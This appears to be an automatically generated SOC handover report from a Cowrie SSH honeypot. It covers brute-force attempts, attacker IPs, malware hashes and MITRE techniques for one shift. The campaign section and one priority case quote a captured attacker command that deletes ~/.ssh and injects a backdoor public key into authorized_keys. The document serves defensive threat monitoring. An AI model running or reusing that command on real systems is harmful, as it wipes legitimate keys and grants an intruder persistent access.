# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-03 |
| **Generated At** | 2026-04-03T08:51:50Z |
| **Shift Time** | 08:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **26** |
| Confirmed Threats | **20** |
| False Positives Filtered | **6** (23.1%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **11** |
| High Severity Cases | **2** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **24** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **16** |
| Unique Usernames | **12** |
| Unique Passwords | **16** |
| Successful Auth Pairs | **2** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `blank` | 2 |
| `Operator` | 2 |
| `root` | 2 |
| `Default` | 2 |
| `nobody` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `0000000` | 1 |
| `6666666` | 1 |
| `1qaz2wsx` | 1 |
| `123` | 1 |
| `qwerty1` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `0000000` | 1 |
| `nobody` | `6666666` | 1 |
| `Operator` | `1qaz2wsx` | 1 |
| `Config` | `123` | 1 |
| `Admin` | `qwerty1` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `samsun55` | `103.210.236.124` | 2026-04-03T07:51:02 |
| `root` | `3245gs5662d34` | `103.210.236.124` | 2026-04-03T07:51:05 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **26** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 13 |
| libssh | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 13 | 13 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 13 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.210.236.124`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **20** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS4760` | HKT Limited | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |
| `AS267788` | IP TECHNOLOGIES S.A.S. | 1 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 1 | HIGH |
| `AS8346` | SONATEL-AS Autonomous System | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4d499ad694e8

| Field | Detail |
|---|---|
| **Source IP** | `103.210.236[.]124` |
| **First Seen** | 2026-04-03 07:51 |
| **Last Seen** | 2026-04-03 07:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 07:51:02` | `cowrie.session.connect` |
| `2026-04-03 07:51:02` | `cowrie.client.version` |
| `2026-04-03 07:51:02` | `cowrie.client.kex` |
| `2026-04-03 07:51:02` | `cowrie.login.success` |
| `2026-04-03 07:51:03` | `cowrie.session.params` |
| `2026-04-03 07:51:03` | `cowrie.command.input` |
| `2026-04-03 07:51:03` | `cowrie.command.failed` |
| `2026-04-03 07:51:03` | `cowrie.log.closed` |
| `2026-04-03 07:51:03` | `cowrie.session.params` |
| `2026-04-03 07:51:03` | `cowrie.command.input` |
| `2026-04-03 07:51:03` | `cowrie.session.file_download` |
| `2026-04-03 07:51:03` | `cowrie.log.closed` |
| `2026-04-03 07:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.236[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.210.236[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6313e50d0a04

| Field | Detail |
|---|---|
| **Source IP** | `103.210.236[.]124` |
| **First Seen** | 2026-04-03 07:51 |
| **Last Seen** | 2026-04-03 07:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-03 07:51:05` | `cowrie.session.connect` |
| `2026-04-03 07:51:05` | `cowrie.client.version` |
| `2026-04-03 07:51:05` | `cowrie.client.kex` |
| `2026-04-03 07:51:05` | `cowrie.login.success` |
| `2026-04-03 07:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.236[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.210.236[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.210.236[.]124` | 1 | 2026-04-03 07:51 | 2026-04-03 07:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.204.1[.]45` | 1 | 2026-04-03 07:05 | 2026-04-03 07:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.183.180[.]108` | 1 | 2026-04-03 08:19 | 2026-04-03 08:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.165.61[.]178` | 1 | 2026-04-03 08:34 | 2026-04-03 08:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `121.196.27[.]240` | 1 | 2026-04-03 08:08 | 2026-04-03 08:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.103.99[.]120` | 1 | 2026-04-03 07:50 | 2026-04-03 07:51 | 31s | 0 | `T1592` | 🟢 LOW |
| `175.206.113[.]91` | 1 | 2026-04-03 07:16 | 2026-04-03 07:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `179.152.12[.]30` | 1 | 2026-04-03 08:27 | 2026-04-03 08:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.78.108[.]126` | 1 | 2026-04-03 07:24 | 2026-04-03 07:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]26` | 1 | 2026-04-03 08:38 | 2026-04-03 08:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.154.80[.]51` | 1 | 2026-04-03 08:46 | 2026-04-03 08:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.29.231[.]106` | 1 | 2026-04-03 07:43 | 2026-04-03 07:43 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.248.65[.]30` | 1 | 2026-04-03 07:42 | 2026-04-03 07:42 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.43[.]109` | 1 | 2026-04-03 07:41 | 2026-04-03 07:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.199.172[.]66` | 1 | 2026-04-03 08:01 | 2026-04-03 08:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.59.91[.]4` | 1 | 2026-04-03 07:21 | 2026-04-03 07:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.18.103[.]142` | 1 | 2026-04-03 08:24 | 2026-04-03 08:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.143[.]45` | 1 | 2026-04-03 07:55 | 2026-04-03 07:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `117.204.1[.]45` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 10 |
| `179.152.12[.]30` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 5 |
| `118.183.180[.]108` | CN | CHINANET Gansu province network | **100** ⚠️ | 50 |
| `121.165.61[.]178` | KR | Korea Telecom | **100** ⚠️ | 23 |
| `219.248.65[.]30` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |
| `46.59.91[.]4` | SE | Bahnhof AB | **100** ⚠️ | 32 |
| `121.196.27[.]240` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 33 |
| `58.18.103[.]142` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `65.20.143[.]45` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 34 |
| `218.29.231[.]106` | CN | China Unicom Henan province network | **100** ⚠️ | 45 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 16 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 2 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 26 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (23.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 18 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-03T08:51:50Z_
